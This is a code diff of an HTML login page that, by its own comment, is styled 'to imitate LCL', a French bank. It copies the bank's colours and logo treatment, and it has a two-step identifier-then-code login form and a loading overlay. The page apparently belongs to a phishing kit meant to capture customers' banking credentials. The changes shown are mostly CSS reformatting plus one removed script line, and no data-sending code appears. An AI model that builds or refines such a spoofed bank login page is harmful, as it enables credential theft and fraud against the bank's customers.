@@ -2,34 +2,164 @@
 <html lang="fr-FR">
 <head>
     <meta charset="utf-8">
-    <title>LCL - Mon espace client</title>
+    <title>LCL - Mon espace</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
+        /* Reset et style de base pour imiter LCL */
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; min-height: 100vh; }
-        .container { width: 100%; max-width: 450px; padding: 20px; display: flex; flex-direction: column; background-color: #004393; color: #ffffff; padding-bottom: 40px; }
-        .logo-container { margin-bottom: 20px; margin-top: 10px; display: flex; justify-content: center; }
-        .logo-container img { width: 120px; height: auto; filter: brightness(0) invert(1); }
-        h1 { font-size: 20px; font-weight: 700; color: #ffffff; margin-bottom: 25px; text-align: left; padding-left: 5px; }
-        .input-group { margin-bottom: 25px; position: relative; text-align: left; padding-left: 5px; }
-        label { display: block; font-size: 14px; color: #ffffff; margin-bottom: 8px; font-weight: 500; }
-        input { width: 100%; height: 50px; padding: 0 15px; font-size: 16px; border: 1px dashed #ffffff; border-radius: 4px; background-color: #ffffff; color: #000000; transition: border-color 0.2s; box-sizing: border-box; }
-        input:focus { border-color: #004393; outline: none; }
-        input::placeholder { color: #999999; font-style: italic; }
-        .checkbox-group { display: flex; align-items: center; margin-bottom: 25px; margin-top: 5px; padding-left: 5px; }
-        .checkbox-group input[type="checkbox"] { width: 20px; height: 20px; margin-right: 10px; accent-color: #ffffff; }
-        .checkbox-group label { margin-bottom: 0; font-size: 14px; color: #ffffff; margin-right: 10px; }
-        button { width: 100%; height: 50px; background-color: #004393; color: #ffffff; border: 1px solid #ffffff; border-radius: 4px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: background-color 0.2s; }
-        button:hover { background-color: #003366; }
-        .secondary-links { margin-top: 20px; text-align: left; padding-left: 5px; }
-        .secondary-links a { display: block; color: #ffffff; text-decoration: none; font-size: 16px; margin-bottom: 10px; font-weight: 500; }
-        .secondary-links a:hover { text-decoration: underline; }
-        .loading-overlay { display: none; flex-direction: column; align-items: center; justify-content: center; height: 100%; width: 100%; }
-        .spinner { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #ffffff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 30px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-overlay .spinner { display: block; }
-        .loading-overlay p { margin-top: 15px; color: #ffffff; font-size: 14px; }
-        .hidden { display: none; }
+        body { 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
+            background-color: #ffffff; 
+            display: flex; 
+            justify-content: center; 
+            min-height: 100vh; 
+        }
+        .container { 
+            width: 100%; 
+            max-width: 450px; 
+            padding: 20px; 
+            display: flex; 
+            flex-direction: column; 
+            background-color: #004393; /* Bleu LCL */
+            color: #ffffff; 
+            padding-bottom: 40px; 
+        }
+        .logo-container { 
+            margin-bottom: 20px; 
+            margin-top: 10px; 
+            display: flex; 
+            justify-content: center; 
+        }
+        .logo-container img { 
+            width: 120px; 
+            height: auto; 
+            filter: brightness(0) invert(1); /* Logo blanc */
+        }
+        h1 { 
+            font-size: 20px; 
+            font-weight: 700; 
+            color: #ffffff; 
+            margin-bottom: 25px; 
+            text-align: left; 
+            padding-left: 5px; 
+        }
+        .input-group { 
+            margin-bottom: 25px; 
+            position: relative; 
+            text-align: left; 
+            padding-left: 5px; 
+        }
+        label { 
+            display: block; 
+            font-size: 14px; 
+            color: #ffffff; 
+            margin-bottom: 8px; 
+            font-weight: 500; 
+        }
+        input { 
+            width: 100%; 
+            height: 50px; 
+            padding: 0 15px; 
+            font-size: 16px; 
+            border: 1px dashed #ffffff; 
+            border-radius: 4px; 
+            background-color: #ffffff; 
+            color: #000000; 
+            transition: border-color 0.2s; 
+            box-sizing: border-box; 
+        }
+        input:focus { 
+            border-color: #004393; 
+            outline: none; 
+        }
+        input::placeholder { 
+            color: #999999; 
+            font-style: italic; 
+        }
+        .checkbox-group { 
+            display: flex; 
+            align-items: center; 
+            margin-bottom: 25px; 
+            margin-top: 5px; 
+            padding-left: 5px; 
+        }
+        .checkbox-group input[type="checkbox"] { 
+            width: 20px; 
+            height: 20px; 
+            margin-right: 10px; 
+            accent-color: #ffffff; 
+        }
+        .checkbox-group label { 
+            margin-bottom: 0; 
+            font-size: 14px; 
+            color: #ffffff; 
+            margin-right: 10px; 
+        }
+        button { 
+            width: 100%; 
+            height: 50px; 
+            background-color: #004393; 
+            color: #ffffff; 
+            border: 1px solid #ffffff; 
+            border-radius: 4px; 
+            font-size: 18px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            margin-top: 10px; 
+            transition: background-color 0.2s; 
+        }
+        button:hover { 
+            background-color: #003366; 
+        }
+        .secondary-links { 
+            margin-top: 20px; 
+            text-align: left; 
+            padding-left: 5px; 
+        }
+        .secondary-links a { 
+            display: block; 
+            color: #ffffff; 
+            text-decoration: none; 
+            font-size: 16px; 
+            margin-bottom: 10px; 
+            font-weight: 500; 
+        }
+        .secondary-links a:hover { 
+            text-decoration: underline; 
+        }
+        .loading-overlay { 
+            display: none; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100%; 
+            width: 100%; 
+        }
+        .spinner { 
+            display: none; 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #ffffff; 
+            border-radius: 50%; 
+            width: 40px; 
+            height: 40px; 
+            animation: spin 1s linear infinite; 
+            margin: 30px auto; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        .loading-overlay .spinner { 
+            display: block; 
+        }
+        .loading-overlay p { 
+            margin-top: 15px; 
+            color: #ffffff; 
+            font-size: 14px; 
+        }
+        .hidden { 
+            display: none; 
+        }
     </style>
 </head>
 <body>
@@ -89,7 +219,6 @@
     const submitBtn = document.getElementById('btnSubmit');
     const loginForm = document.getElementById('loginForm');
     const loadingOverlay = document.getElementById('loadingOverlay');
-    const container = document.querySelector('.container');
 
     // 1. Gestion du passage de l'identifiant au code
     submitBtn.addEventListener('click', function(e) {
